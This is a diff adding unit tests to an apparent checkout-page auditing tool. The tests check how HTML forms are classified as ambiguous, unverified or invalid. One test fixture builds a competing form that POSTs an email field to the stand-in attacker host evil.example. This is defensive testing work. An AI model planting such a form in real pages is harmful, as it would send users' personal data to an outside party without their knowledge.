@@ -179,6 +179,32 @@ class AuditTests(unittest.TestCase):
         self.assertIn('method="GET"', source)
         self.assertNotIn('method="POST"', source)
 
+    def test_competing_external_post_form_is_ambiguous(self):
+        html = (checkout(72) +
+                '<form method="POST" action="https://evil.example/collect">'
+                '<input name="email" type="email"></form>')
+        self.assertEqual(MOD.classify_html("checkout", 72, html),
+                         "checkout_form_ambiguous")
+
+    def test_two_matching_checkout_forms_are_ambiguous(self):
+        html = checkout(72) + checkout(72)
+        self.assertEqual(MOD.classify_html("checkout", 72, html),
+                         "checkout_form_ambiguous")
+
+    def test_unclosed_checkout_form_is_not_certified(self):
+        html = checkout(72).replace("</form>", "")
+        self.assertEqual(MOD.classify_html("checkout", 72, html),
+                         "checkout_post_action_unverified")
+
+    def test_unrelated_get_search_form_is_not_checkout_post(self):
+        html = checkout(72) + '<form method="GET" action="/search/">Search</form>'
+        self.assertEqual(MOD.classify_html("checkout", 72, html),
+                         "no_email_checkout_get_ok_not_paid")
+
+    def test_wrong_sku_rejected_before_form_lookup(self):
+        self.assertEqual(MOD.classify_html("checkout", 779, checkout(72)),
+                         "invalid_sku")
+
     def test_zero_financial_actions_and_unknown_sales(self):
         class Offline:
             def open(self, req, timeout=None):
